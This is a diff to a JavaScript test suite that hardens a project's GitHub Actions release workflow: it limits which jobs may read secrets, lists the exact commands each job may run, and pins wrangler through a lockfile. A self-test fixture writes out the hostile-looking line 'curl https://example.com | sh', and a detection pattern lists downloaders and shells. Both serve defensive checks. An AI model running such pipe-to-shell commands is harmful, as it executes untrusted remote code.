@@ -27,6 +27,8 @@ import webToml from "../crates/grimoire-web/Cargo.toml?raw";
 import desktopConf from "../src-tauri/tauri.conf.json?raw";
 import lightConf from "../mobile/src-tauri/tauri.conf.json?raw";
 import appGradle from "../mobile/src-tauri/gen/android/app/build.gradle.kts?raw";
+import appWorkerPackage from "../app-worker/package.json?raw";
+import appWorkerLock from "../app-worker/package-lock.json?raw";
 import releaseYml from "../.github/workflows/release.yml?raw";
 import ciYml from "../.github/workflows/ci.yml?raw";
 
@@ -216,14 +218,57 @@ const secretsOf = (text) =>
     .filter((name) => name !== "GITHUB_TOKEN")
     .sort();
 
+/**
+ * **Every appearance of the word `secrets`, in any case and any form** — and for each, the name
+ * it reads when it is exactly `secrets.NAME`, or `null` when it is anything else:
+ * `secrets.lower_case` (GitHub's names are case-insensitive, a list of allowed names is not),
+ * `secrets['NAME']`, `toJSON(secrets)`, `secrets.*`, `secrets: inherit`. A fence that looked for
+ * the one honest spelling would let every other one through.
+ */
+const secretRefs = (text) =>
+  [...text.matchAll(/secrets/gi)].map((m) => {
+    const exact = /^secrets\.([A-Z][A-Z0-9_]*)(?![\w.[*])/.exec(text.slice(m.index));
+    const alone = !/[\w.]/.test(text[m.index - 1] ?? " ");
+    return {
+      seen: text.slice(Math.max(0, m.index - 10), m.index + 44).replace(/\s+/g, " "),
+      name: exact && alone ? exact[1] : null,
+    };
+  });
+
+/**
+ * What can run a program, as a word on a line: package runners, interpreters, build tools,
+ * downloaders, `gh`. Lines that only *name* one — an action, the shell, the Node pin — are not
+ * commands. (No `tauri`: its CLI is only ever reached through `npx`, `npm` or `cargo`, and the
+ * word is in every path under `mobile/src-tauri/`.)
+ */
+const RUNS_SOMETHING =
+  /\b(?:npx|npm|pnpm|yarn|bun|deno|node|cargo|rustc|gradle\w*|python\d*|pip\d*|curl|wget|bash|sh|pwsh|docker|gh|make)\b/;
+const commandsOf = (job) =>
+  job
+    .split("\n")
+    .map((line) => line.trim())
+    .filter((line) => RUNS_SOMETHING.test(line))
+    .filter((line) => !/^(?:- )?(?:uses|shell|node-version-file|name):/.test(line));
+
 const ANDROID_SECRETS = [
   "ANDROID_KEYSTORE_BASE64",
   "ANDROID_KEYSTORE_PASSWORD",
-  "ANDROID_KEY_ALIAS",
   "ANDROID_KEY_PASSWORD",
 ];
 const CLOUDFLARE_SECRETS = ["CLOUDFLARE_ACCOUNT_ID", "CLOUDFLARE_API_TOKEN"];
+/** Every secret each job may read, and it must read exactly these. */
+const MAY_READ = {
+  "release-please": ["GITHUB_TOKEN"],
+  build: ["GITHUB_TOKEN"],
+  android: [],
+  "android-sign": [...ANDROID_SECRETS, "GITHUB_TOKEN"],
+  web: [],
+  "web-deploy": [...CLOUDFLARE_SECRETS, "GITHUB_TOKEN"],
+  publish: ["GITHUB_TOKEN"],
+};
 const ON_A_RELEASE = "    if: needs.release-please.outputs.release_created == 'true'";
+/** The committed fingerprint of the certificate every release's APK is signed with. */
+const SIGNER_PIN = "mobile/src-tauri/release-signer.sha256";
 
 describe("release.yml", () => {
   const jobs = jobsOf(releaseYml);
@@ -263,58 +308,137 @@ describe("release.yml", () => {
     expect(code(releaseYml)).not.toMatch(/always\(\)|failure\(\)|cancelled\(\)|continue-on-error/);
   });
 
+  // **A release is a push to `main` and nothing else.** A `workflow_dispatch` or a
+  // `pull_request` trigger would let a branch's copy of this file run — and ask for the release
+  // environment — with only that environment's branch rule in the way.
+  it("is triggered by a push to main, and by nothing else", () => {
+    const top = code(releaseYml).slice(0, code(releaseYml).search(/^jobs:/m));
+    const on = /^on:\n(?: .*\n|\n)*/m.exec(top)?.[0].trimEnd();
+    expect(on).toBe("on:\n  push:\n    branches: [main]");
+    expect(top).not.toMatch(/^env:/m);
+    expect(secretRefs(top)).toEqual([]);
+  });
+
   it("gives the signing key to `android-sign` and the deploy token to `web-deploy`, alone", () => {
-    const holders = Object.fromEntries(
-      Object.entries(jobs)
-        .map(([name, job]) => [name, secretsOf(job)])
-        .filter(([, secrets]) => secrets.length > 0),
-    );
-    expect(holders).toEqual({
-      "android-sign": ANDROID_SECRETS,
-      "web-deploy": CLOUDFLARE_SECRETS,
-    });
+    for (const [name, job] of Object.entries(jobs)) {
+      const refs = secretRefs(job);
+      // Every appearance of the word is the one honest spelling…
+      expect(
+        refs.filter((ref) => ref.name === null),
+        name,
+      ).toEqual([]);
+      // …and reads a secret this job may read; and the job reads all of those and no other.
+      expect([...new Set(refs.map((ref) => ref.name))].sort(), name).toEqual(
+        [...MAY_READ[name]].sort(),
+      );
+    }
+    expect(Object.keys(MAY_READ)).toEqual(Object.keys(jobs));
+  });
+
+  // A job-level `env:` would hand its values to every step of the job — the checkout, the
+  // artifact download, the install — which is the hole the per-step rule below exists to close.
+  it.each(Object.keys(MAY_READ))("%s names no secret and no env above its steps", (name) => {
+    const head = jobs[name].slice(0, jobs[name].search(/^ {4}steps:/m));
+    expect(head.length).toBeGreaterThan(0);
+    expect(secretRefs(head)).toEqual([]);
+    expect(head).not.toMatch(/^ {4}env:/m);
+  });
+
+  // **An environment's values, not the repository's.** A repository secret is handed to any
+  // workflow on any branch of this repository; an environment's only to a job that names it,
+  // from a branch the environment allows.
+  it("takes what it holds from the `release` environment, in those two jobs and no other", () => {
+    const environments = Object.entries(jobs)
+      .map(([name, job]) => [name, job.split("\n").filter((line) => /^\s*environment:/.test(line))])
+      .filter(([, lines]) => lines.length > 0);
+    expect(environments).toEqual([
+      ["android-sign", ["    environment: release"]],
+      ["web-deploy", ["    environment: release"]],
+    ]);
+  });
+
+  it.each(["android", "android-sign", "web", "web-deploy"])("%s has a deadline", (name) => {
+    expect(jobs[name]).toMatch(/^ {4}timeout-minutes: \d+$/m);
   });
 
   // The rule the removed `sign` job left behind: a secret never sits in a build leg, because a
   // build leg runs every npm lifecycle script, cargo build script and Gradle plugin, and any of
-  // them can read a file or an environment.
-  it.each(["android-sign", "web-deploy"])("%s builds nothing", (name) => {
-    expect(jobs[name]).not.toMatch(
-      /\bnpm (?:ci|install|run|exec)\b|\bcargo\b|\btauri\b|gradle|rust-cache|rust-toolchain|tauri-action|\bcache: npm\b/i,
-    );
-    const actions = [...jobs[name].matchAll(/uses: ([\w./-]+)@/g)].map((m) => m[1]).sort();
-    expect(actions).toEqual(
-      name === "android-sign"
-        ? ["actions/checkout", "actions/download-artifact"]
-        : ["actions/checkout", "actions/download-artifact", "actions/setup-node"],
-    );
+  // them can read a file or an environment. **Held as a list of everything the job may run**,
+  // to the letter: a second `npx`, a `node -e`, an `npm run`, a `curl | sh` is a line that is
+  // not on it.
+  it.each([
+    [
+      "android-sign",
+      ["actions/checkout", "actions/download-artifact"],
+      [
+        'bash scripts/android-sign.sh apk-in/mtg-grimoire-light-arm64.apk "$apk"',
+        'gh release upload "${{ needs.release-please.outputs.tag_name }}" \\',
+      ],
+    ],
+    [
+      "web-deploy",
+      ["actions/checkout", "actions/download-artifact", "actions/setup-node"],
+      [
+        'latest=$(gh api "repos/$REPO/releases/latest" --jq .tag_name)',
+        // The lockfile's packages, no lifecycle script; then what that installed, or nothing.
+        "run: npm ci --ignore-scripts",
+        "run: npx --no-install wrangler deploy",
+        "run: node scripts/web-deploy-probe.mjs dist-web",
+      ],
+    ],
+  ])("%s builds nothing, and runs only what is listed here", (name, actions, commands) => {
+    expect([...jobs[name].matchAll(/uses: ([\w./-]+)@/g)].map((m) => m[1]).sort()).toEqual(actions);
+    expect(commandsOf(jobs[name])).toEqual(commands);
+    expect(jobs[name]).not.toMatch(/rust-cache|rust-toolchain|tauri-action|\bcache:/);
   });
 
   it.each([
-    ["android-sign", "key", ANDROID_SECRETS, 2],
-    ["web-deploy", "token", CLOUDFLARE_SECRETS, 2],
-  ])(
-    "%s asks first whether its secrets are set, and does nothing without them",
-    (name, id, secrets, readers) => {
-      const steps = stepsOf(jobs[name]);
-      // The first step reads them and answers; it is the only one that runs without them.
-      expect(steps[0]).toMatch(new RegExp(`^ {8}id: ${id}$`, "m"));
-      expect(secretsOf(steps[0])).toEqual(secrets);
-      expect(steps[0]).toContain('echo "present=true" >> "$GITHUB_OUTPUT"');
-      expect(steps[0]).toContain('echo "present=false" >> "$GITHUB_OUTPUT"');
-      // Some and not all is a mistake in the settings, and a failure — never a quiet skip.
-      expect(steps[0]).toMatch(/if \[ "\$found" -gt 0 \]; then[\s\S]*?exit 1/);
-      // And it says so where a release's reader looks.
-      expect(steps[0]).toMatch(/>> "\$GITHUB_STEP_SUMMARY"/);
-      for (const step of steps.slice(1)) {
-        expect(step).toMatch(
-          new RegExp(`^ {8}if: steps\\.${id}\\.outputs\\.present == 'true'$`, "m"),
-        );
-      }
-      // The secrets reach the step that asks and the one step that uses them.
-      expect(steps.filter((step) => secretsOf(step).length > 0)).toHaveLength(readers);
-    },
-  );
+    ["android-sign", "key", ANDROID_SECRETS],
+    ["web-deploy", "token", CLOUDFLARE_SECRETS],
+  ])("%s asks whether its secrets are set, and does nothing without them", (name, id, secrets) => {
+    const [checkout, ask, ...rest] = stepsOf(jobs[name]);
+    // The checkout, which holds nothing; then the step that asks, the only other one that
+    // runs without them.
+    expect(checkout).toMatch(/^uses: actions\/checkout@/);
+    expect(checkout).not.toMatch(/^ {8}(?:if|env):/m);
+    expect(ask).toMatch(new RegExp(`^ {8}id: ${id}$`, "m"));
+    expect(secretsOf(ask)).toEqual(secrets);
+    // **It is told whether each is set, never what it is**: every read in it is the
+    // comparison, so no key and no token is in the environment of a step that only counts.
+    expect(ask.match(/secrets\.[A-Z0-9_]+/g)).toHaveLength(secrets.length);
+    expect(ask.match(/\$\{\{ secrets\.[A-Z0-9_]+ != '' \}\}/g)).toHaveLength(secrets.length);
+    expect(ask).toContain('echo "present=true" >> "$GITHUB_OUTPUT"');
+    expect(ask).toContain('echo "present=false" >> "$GITHUB_OUTPUT"');
+    // Some and not all is a mistake in the settings, and a failure — never a quiet skip.
+    expect(ask).toMatch(/\[ "\$found" -gt 0 \][^\n]*then[\s\S]*?exit 1/);
+    // And it says so where a release's reader looks.
+    expect(ask).toMatch(/>> "\$GITHUB_STEP_SUMMARY"/);
+    expect(rest.length).toBeGreaterThan(2);
+    for (const step of rest) {
+      expect(step).toMatch(
+        new RegExp(`^ {8}if: steps\\.${id}\\.outputs\\.present == 'true'$`, "m"),
+      );
+    }
+    // The values themselves reach exactly one step.
+    expect(rest.filter((step) => secretsOf(step).length > 0)).toHaveLength(1);
+  });
+
+  // "Signed by the keystore in the settings" is not "signed by the key the last release was".
+  it("attaches no APK without the committed fingerprint, and holds the key to it", () => {
+    const [, ask, , sign] = stepsOf(jobs["android-sign"]);
+    expect(ask).toContain(`PIN: ${SIGNER_PIN}`);
+    // `present=true` is said in one place, and only with every value set and the file there.
+    expect(ask.match(/present=true/g)).toHaveLength(1);
+    expect(ask).toMatch(
+      /if \[ -z "\$missing" \] && \[ -f "\$PIN" \]; then\n\s+echo "present=true"/,
+    );
+    expect(sign).toContain(`ANDROID_SIGNER_PIN: ${SIGNER_PIN}`);
+    // The alias is a plain word: as a secret, GitHub would mask every `mtg-grimoire` in the log.
+    expect(sign).toMatch(/^ {10}ANDROID_KEY_ALIAS: mtg-grimoire$/m);
+    // Nobody else on the runner reads the keystore while it exists.
+    expect(sign.indexOf("umask 077")).toBeGreaterThan(-1);
+    expect(sign.indexOf("umask 077")).toBeLessThan(sign.indexOf("base64 --decode"));
+  });
 
   it("attaches the APK the signing script wrote, under the release's name", () => {
     const sign = jobs["android-sign"];
@@ -365,9 +489,27 @@ describe("release.yml", () => {
 
     const deploy = stepsOf(jobs["web-deploy"]);
     const step = (needle) => deploy.findIndex((s) => s.includes(needle));
-    expect(step("name: web-bundle")).toBeGreaterThan(-1);
-    expect(step("wrangler@")).toBeGreaterThan(step("name: web-bundle"));
-    expect(step("node scripts/web-deploy-probe.mjs dist-web")).toBeGreaterThan(step("wrangler@"));
+    const order = [
+      // Before anything is downloaded or installed: is this tag older than what is published?
+      'gh api "repos/$REPO/releases/latest"',
+      "name: web-bundle",
+      "run: npm ci --ignore-scripts",
+      "run: npx --no-install wrangler deploy",
+      "run: node scripts/web-deploy-probe.mjs dist-web",
+    ].map(step);
+    expect(order[0]).toBeGreaterThan(-1);
+    expect(order).toEqual([...order].sort((a, b) => a - b));
+    expect(new Set(order).size).toBe(order.length);
+  });
+
+  // A re-run of this job long after its run would upload this tag's bundle over a later
+  // release's: an older user schema in front of desktops that have moved on.
+  it("refuses to deploy a release older than the newest published one", () => {
+    const refusal = stepsOf(jobs["web-deploy"]).find((s) => s.includes("releases/latest"));
+    expect(refusal).toMatch(
+      /newest=\$\(printf '%s\\n%s\\n' "\$latest" "\$TAG" \| sort -V \| tail -1\)/,
+    );
+    expect(refusal).toMatch(/if \[ "\$newest" != "\$TAG" \]; then[\s\S]*exit 1/);
   });
 
   it("publishes last, and nothing else flips the draft", () => {
@@ -396,17 +538,53 @@ describe("deploys, across every workflow", () => {
   // **The one job that may deploy anything, and the one Worker it may deploy.** The relay holds
   // secrets and a D1 with real entitlements, and the share Worker a D1 and R2 of its own; their
   // deploys stay by hand (root CLAUDE.md, "Deployments").
-  it("runs wrangler once: `web-deploy`, an exact version, from app-worker/", () => {
+  it("runs wrangler once: `web-deploy`, the lockfile's, from app-worker/", () => {
     const wrangler = lines.filter(({ line }) => /\bwrangler\b/.test(line));
     expect(wrangler).toEqual([
       {
         path: "/.github/workflows/release.yml",
-        line: expect.stringMatching(/^ {8}run: npx --yes wrangler@\d+\.\d+\.\d+ deploy$/),
+        // `--no-install`: what the lockfile's install put there, or a failure. Never a
+        // version typed here, which `npx` would resolve — with everything under it — on the day.
+        line: "        run: npx --no-install wrangler deploy",
       },
     ]);
-    const step = stepsOf(jobsOf(releaseYml)["web-deploy"]).find((s) => /\bwrangler\b/.test(s));
-    expect(step).toMatch(/^ {8}working-directory: app-worker$/m);
-    expect(secretsOf(step)).toEqual(CLOUDFLARE_SECRETS);
+    const steps = stepsOf(jobsOf(releaseYml)["web-deploy"]);
+    const at = steps.findIndex((s) => /\bwrangler\b/.test(s));
+    expect(steps[at]).toMatch(/^ {8}working-directory: app-worker$/m);
+    expect(secretsOf(steps[at])).toEqual(CLOUDFLARE_SECRETS);
+    // The install is the step before it, in the same directory, and **nothing is in its
+    // environment**: what it installs is not run until the token's step, and it runs no script.
+    expect(steps[at - 1]).toMatch(/^ {8}run: npm ci --ignore-scripts$/m);
+    expect(steps[at - 1]).toMatch(/^ {8}working-directory: app-worker$/m);
+    expect(steps[at - 1]).not.toMatch(/^ {8}env:/m);
+    expect(secretRefs(steps[at - 1])).toEqual([]);
+  });
+
+  // **What "pinned" means here: a lockfile.** `npx wrangler@4.146.0` pinned one package of
+  // ninety-one; the rest came through floating ranges, resolved on the day of the deploy.
+  it("pins wrangler and everything under it in app-worker's lockfile", () => {
+    const manifest = JSON.parse(appWorkerPackage);
+    const lock = JSON.parse(appWorkerLock);
+    expect(manifest.private).toBe(true);
+    expect(manifest.dependencies).toBeUndefined();
+    expect(manifest.scripts).toBeUndefined();
+    expect(Object.keys(manifest.devDependencies)).toEqual(["wrangler"]);
+    const version = manifest.devDependencies.wrangler;
+    // An exact version: a range in the manifest is a lockfile the next `npm install` may move.
+    expect(version).toMatch(/^\d+\.\d+\.\d+$/);
+    expect(lock.lockfileVersion).toBe(3);
+    expect(lock.packages[""].devDependencies).toEqual({ wrangler: version });
+    expect(lock.packages["node_modules/wrangler"].version).toBe(version);
+    const others = Object.entries(lock.packages).filter(([path]) => path !== "");
+    expect(others.length).toBeGreaterThan(20);
+    // Each one from the registry, with the hash `npm ci` checks the tarball against.
+    for (const [path, entry] of others) {
+      expect(entry.resolved, path).toMatch(/^https:\/\/registry\.npmjs\.org\//);
+      expect(entry.integrity, path).toMatch(/^sha512-/);
+    }
+    // The runner's platform is in it: `npm ci` on Linux installs these two without a script.
+    expect(lock.packages["node_modules/@esbuild/linux-x64"]).toBeDefined();
+    expect(lock.packages["node_modules/@cloudflare/workerd-linux-64"]).toBeDefined();
   });
 
   it("names neither of the other two Workers, and no Cloudflare secret anywhere else", () => {
@@ -429,6 +607,44 @@ describe("deploys, across every workflow", () => {
 });
 
 describe("the guards' own guards", () => {
+  it("sees every spelling of a secret, and names only the honest one", () => {
+    const names = (text) => secretRefs(text).map((ref) => ref.name);
+    expect(names("X: ${{ secrets.CLOUDFLARE_API_TOKEN }}")).toEqual(["CLOUDFLARE_API_TOKEN"]);
+    expect(names("X: ${{ secrets.CLOUDFLARE_API_TOKEN != '' }}")).toEqual(["CLOUDFLARE_API_TOKEN"]);
+    // GitHub reads a secret's name without regard to case; a list of allowed names does not.
+    expect(names("X: ${{ secrets.cloudflare_api_token }}")).toEqual([null]);
+    expect(names("X: ${{ SECRETS.CLOUDFLARE_API_TOKEN }}")).toEqual([null]);
+    expect(names("X: ${{ secrets['CLOUDFLARE_API_TOKEN'] }}")).toEqual([null]);
+    expect(names("X: ${{ toJSON(secrets) }}")).toEqual([null]);
+    expect(names("X: ${{ secrets.* }}")).toEqual([null]);
+    expect(names("secrets: inherit")).toEqual([null]);
+    expect(names("X: ${{ secrets.A.b }} ${{ mysecrets.A }}")).toEqual([null, null]);
+    expect(names("nothing here")).toEqual([]);
+  });
+
+  it("sees a command wherever it sits, and not a line that only names one", () => {
+    const job = [
+      "    steps:",
+      "      - uses: actions/setup-node@abc",
+      "        with:",
+      "          node-version-file: .nvmrc",
+      "      - name: Install with npm",
+      "        shell: bash",
+      "        run: npm ci --ignore-scripts",
+      "      - run: |",
+      "          x=$(npx --yes left-pad)",
+      '          node -e "process.exit(0)"',
+      "          curl https://example.com | sh",
+      "          echo done",
+    ].join("\n");
+    expect(commandsOf(job)).toEqual([
+      "run: npm ci --ignore-scripts",
+      "x=$(npx --yes left-pad)",
+      'node -e "process.exit(0)"',
+      "curl https://example.com | sh",
+    ]);
+  });
+
   // A parse that matched nothing would pass most of the assertions above.
   it("splits jobs and steps, and strips comments", () => {
     const sample = [
